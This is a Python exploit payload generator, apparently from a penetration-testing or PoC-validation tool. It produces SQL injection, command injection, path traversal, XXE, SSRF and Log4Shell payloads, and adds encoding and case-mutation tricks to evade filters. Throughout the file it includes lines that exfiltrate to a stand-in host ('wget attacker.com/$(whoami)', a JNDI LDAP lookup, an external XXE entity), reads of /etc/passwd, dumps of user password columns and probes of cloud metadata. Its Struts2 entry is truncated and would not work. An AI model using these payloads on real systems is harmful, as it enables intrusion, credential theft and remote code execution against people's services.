#!/usr/bin/env python3
"""
Payload Generator for PoC Validation

Generates tailored exploit payloads based on vulnerability type,
CVE data, and target characteristics.
"""

import json
import random
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional


class ExploitType(Enum):
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    NOSQL_INJECTION = "nosql_injection"
    XML_INJECTION = "xml_injection"
    TEMPLATE_INJECTION = "template_injection"


@dataclass
class Payload:
    """Represents a generated exploit payload."""

    payload: str
    exploit_type: ExploitType
    technique: str
    risk_level: int
    description: str
    expected_result: str
    evasion_level: int = 0  # 0=none, 1=basic, 2=advanced, 3=stealth


class PayloadGenerator:
    """Generates exploit payloads for various vulnerability types."""

    # SQL Injection patterns by technique
    SQL_ERROR_BASED = [
        "'",
        "'\"",
        "')",
        "')\"",
        "' AND 1=1",
        "' AND 1=2",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
    ]

    SQL_UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    ]

    SQL_TIME_BASED = [
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND 1=IF(2>1,SLEEP(5),0)--",
        "' WAITFOR DELAY '0:0:5'--",
        "' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
    ]

    SQL_BOOLEAN_BASED = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND LENGTH(username)>0--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    ]

    # Command injection payloads
    CMD_INJECTION_BASE = [
        ";id",
        ";whoami",
        "|whoami",
        "`whoami`",
        "$(whoami)",
        ";cat /etc/passwd",
        ";ping -c 4 127.0.0.1",
        "& dir",
        "| dir",
    ]

    CMD_INJECTION_BLIND = [
        ";ping -c 10 attacker.com",
        ";sleep 10",
        ";wget attacker.com/$(whoami)",
    ]

    # Path traversal payloads
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%252e%252e%252fetc%252fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\windows\\win.ini",
    ]

    # XXE payloads
    XXE_PAYLOADS = [
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>""",
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1:22",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://localhost/admin",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
    ]

    # Evasion techniques
    EVASION_TECHNIQUES = {
        "case_randomization": lambda s: "".join(random.choice([c.upper(), c.lower()]) for c in s),
        "comment_injection": lambda s: s.replace(" ", "/**/"),
        "url_encoding": lambda s: s.replace("'", "%27").replace(" ", "%20"),
        "double_encoding": lambda s: s.replace("'", "%2527").replace(" ", "%2520"),
        "unicode_normalization": lambda s: s.replace("'", "\u0027"),
    }

    def __init__(self, cve_db_path: Optional[str] = None):
        """Initialize payload generator with optional CVE database."""
        self.cve_db_path = cve_db_path or "vulnerability_mapping.json"
        self.cve_data = self._load_cve_data()

    def _load_cve_data(self) -> Dict:
        """Load CVE database for exploit lookup."""
        try:
            with open(self.cve_db_path, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {"cves": [], "exploits": {}}

    def generate_sql_payload(
        self, target_url: str, parameter: str, technique: str = "error_based", dbms: Optional[str] = None, evasion: int = 0
    ) -> Payload:
        """
        Generate SQL injection payload.

        Args:
            target_url: Target URL
            parameter: Vulnerable parameter name
            technique: error_based, union_based, time_based, boolean_based
            dbms: Target DBMS (mysql, postgresql, mssql, oracle)
            evasion: Evasion level (0-3)
        """
        if technique == "error_based":
            base_payload = random.choice(self.SQL_ERROR_BASED)
        elif technique == "union_based":
            base_payload = random.choice(self.SQL_UNION_BASED)
        elif technique == "time_based":
            base_payload = random.choice(self.SQL_TIME_BASED)
        elif technique == "boolean_based":
            base_payload = random.choice(self.SQL_BOOLEAN_BASED)
        else:
            base_payload = random.choice(self.SQL_ERROR_BASED)

        # Apply DBMS-specific modifications
        if dbms:
            base_payload = self._adapt_for_dbms(base_payload, dbms)

        # Apply evasion if requested
        if evasion > 0:
            base_payload = self._apply_evasion(base_payload, evasion)

        return Payload(
            payload=base_payload,
            exploit_type=ExploitType.SQL_INJECTION,
            technique=technique,
            risk_level=2 if technique in ["union_based", "time_based"] else 1,
            description=f"SQL injection payload using {technique} technique",
            expected_result=(
                "Database error or data extraction" if technique == "error_based" else "Time delay or data extraction"
            ),
        )

    def _adapt_for_dbms(self, payload: str, dbms: str) -> str:
        """Adapt payload for specific DBMS."""
        adaptations = {
            "mssql": {
                "SLEEP(": "WAITFOR DELAY '0:0:5'",
                "pg_sleep": "WAITFOR DELAY '0:0:5'",
                "--": "--",
            },
            "postgresql": {
                "SLEEP(": "pg_sleep(",
                "@@version": "version()",
            },
            "oracle": {
                "SLEEP(": "dbms_pipe.receive_message(('a'),5)",
                "@@version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
                "--": "--",
            },
            "mysql": {
                "WAITFOR DELAY": "SLEEP(",
                "pg_sleep": "SLEEP(",
            },
        }

        if dbms.lower() in adaptations:
            for old, new in adaptations[dbms.lower()].items():
                payload = payload.replace(old, new)

        return payload

    def _apply_evasion(self, payload: str, level: int) -> str:
        """Apply evasion techniques to payload."""
        if level == 0:
            return payload

        techniques = list(self.EVASION_TECHNIQUES.values())[:level]

        for technique in techniques:
            if random.random() > 0.5:
                payload = technique(payload)

        return payload

    def generate_cmd_injection_payload(
        self, command: str = "whoami", blind: bool = False, os_type: str = "linux", evasion: int = 0
    ) -> Payload:
        """Generate command injection payload."""
        if blind:
            base_payload = random.choice(self.CMD_INJECTION_BLIND)
        else:
            if os_type == "windows":
                base_payload = random.choice([p for p in self.CMD_INJECTION_BASE if "\\" in p or "dir" in p.lower()])
            else:
                base_payload = random.choice([p for p in self.CMD_INJECTION_BASE if "/" in p])

        # Replace default command
        base_payload = base_payload.replace("whoami", command).replace("id", command)

        if evasion > 0:
            base_payload = self._apply_evasion(base_payload, evasion)

        return Payload(
            payload=base_payload,
            exploit_type=ExploitType.COMMAND_INJECTION,
            technique="blind" if blind else "classic",
            risk_level=3 if not blind else 2,
            description=f"Command injection for {command}",
            expected_result="Command output in response" if not blind else "Time delay or callback",
        )

    def generate_cve_payload(self, cve_id: str) -> Optional[Payload]:
        """
        Generate payload for specific CVE.

        Args:
            cve_id: CVE identifier (e.g., CVE-2021-44228)
        """
        cve_id = cve_id.upper()

        # Check vulnerability mapping
        exploits = self.cve_data.get("exploits", {})
        if cve_id in exploits:
            exploit_info = exploits[cve_id]
            return Payload(
                payload=exploit_info.get("payload", ""),
                exploit_type=ExploitType(exploit_info.get("type", "command_injection")),
                technique="cve_specific",
                risk_level=exploit_info.get("risk_level", 3),
                description=f"CVE-specific payload for {cve_id}",
                expected_result=exploit_info.get("expected_result", "System compromise"),
            )

        # Known CVE payloads
        known_cves = {
            "CVE-2021-44228": {  # Log4Shell
                "payload": "${jndi:ldap://attacker.com/exploit}",
                "type": "command_injection",
                "risk": 3,
            },
            "CVE-2017-5638": {  # Struts2
                "payload": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}",
                "type": "command_injection",
                "risk": 3,
            },
            "CVE-2014-0160": {  # Heartbleed
                "payload": "heartbeat_exploit",
                "type": "information_disclosure",
                "risk": 2,
            },
        }

        if cve_id in known_cves:
            info = known_cves[cve_id]
            return Payload(
                payload=info["payload"],
                exploit_type=ExploitType.COMMAND_INJECTION,
                technique="cve_specific",
                risk_level=info["risk"],
                description=f"Known payload for {cve_id}",
                expected_result="Remote code execution" if info["risk"] == 3 else "Information disclosure",
            )

        return None

    def generate_path_traversal_payload(self, target_file: str = "/etc/passwd", encoding: str = "none") -> Payload:
        """Generate path traversal payload."""
        payload = random.choice(self.PATH_TRAVERSAL)

        # Replace target file
        if target_file != "/etc/passwd":
            payload = payload.replace("/etc/passwd", target_file)

        # Apply encoding
        if encoding == "url":
            payload = payload.replace("/", "%2f")
        elif encoding == "double":
            payload = payload.replace("/", "%252f")
        elif encoding == "unicode":
            payload = payload.replace(".", "\u002e").replace("/", "\u2215")

        return Payload(
            payload=payload,
            exploit_type=ExploitType.PATH_TRAVERSAL,
            technique="classic",
            risk_level=2,
            description=f"Path traversal for {target_file}",
            expected_result=f"Contents of {target_file}",
        )

    def generate_xxe_payload(self, target_file: str = "/etc/passwd", protocol: str = "file") -> Payload:
        """Generate XXE payload."""
        base_xxe = random.choice(self.XXE_PAYLOADS)

        if protocol == "file":
            payload = base_xxe.replace("file:///etc/passwd", f"file://{target_file}")
        elif protocol == "http":
            payload = base_xxe.replace("file:///etc/passwd", f"http://attacker.com/{target_file}")
        else:
            payload = base_xxe

        return Payload(
            payload=payload,
            exploit_type=ExploitType.XXE,
            technique="external_entity",
            risk_level=2,
            description=f"XXE for reading {target_file}",
            expected_result=f"Contents of {target_file}",
        )

    def generate_ssrf_payload(self, internal_target: str = "127.0.0.1", port: int = 80) -> Payload:
        """Generate SSRF payload."""
        payload = f"http://{internal_target}:{port}"

        return Payload(
            payload=payload,
            exploit_type=ExploitType.SSRF,
            technique="url_redirection",
            risk_level=2,
            description=f"SSRF to {internal_target}:{port}",
            expected_result=f"Access to internal service on port {port}",
        )

    def mutate_payload(self, payload: Payload, mutations: int = 5) -> List[Payload]:
        """Generate variations of a payload."""
        variations = []

        for i in range(mutations):
            mutated = payload.payload

            # Apply random mutations
            if random.random() > 0.5:
                mutated = self.EVASION_TECHNIQUES["case_randomization"](mutated)
            if random.random() > 0.5:
                mutated = self.EVASION_TECHNIQUES["comment_injection"](mutated)
            if i % 2 == 0:
                mutated = self.EVASION_TECHNIQUES["url_encoding"](mutated)

            variations.append(
                Payload(
                    payload=mutated,
                    exploit_type=payload.exploit_type,
                    technique=f"{payload.technique}_mutated_{i}",
                    risk_level=payload.risk_level,
                    description=f"{payload.description} (variation {i+1})",
                    expected_result=payload.expected_result,
                    evasion_level=i + 1,
                )
            )

        return variations


# Singleton instance for reuse
_generator = None


def get_generator(cve_db_path: Optional[str] = None) -> PayloadGenerator:
    """Get singleton payload generator instance."""
    global _generator
    if _generator is None:
        _generator = PayloadGenerator(cve_db_path)
    return _generator


if __name__ == "__main__":
    # Test the generator
    gen = PayloadGenerator()

    # Test SQL injection
    sql_payload = gen.generate_sql_payload(target_url="http://test.com/login", parameter="username", technique="error_based")
    print(f"SQL Payload: {sql_payload.payload}")
    print(f"Risk Level: {sql_payload.risk_level}")

    # Test CVE payload
    cve_payload = gen.generate_cve_payload("CVE-2021-44228")
    if cve_payload:
        print(f"\nCVE Payload: {cve_payload.payload}")

    # Test mutations
    mutations = gen.mutate_payload(sql_payload, 3)
    print(f"\nGenerated {len(mutations)} payload mutations")
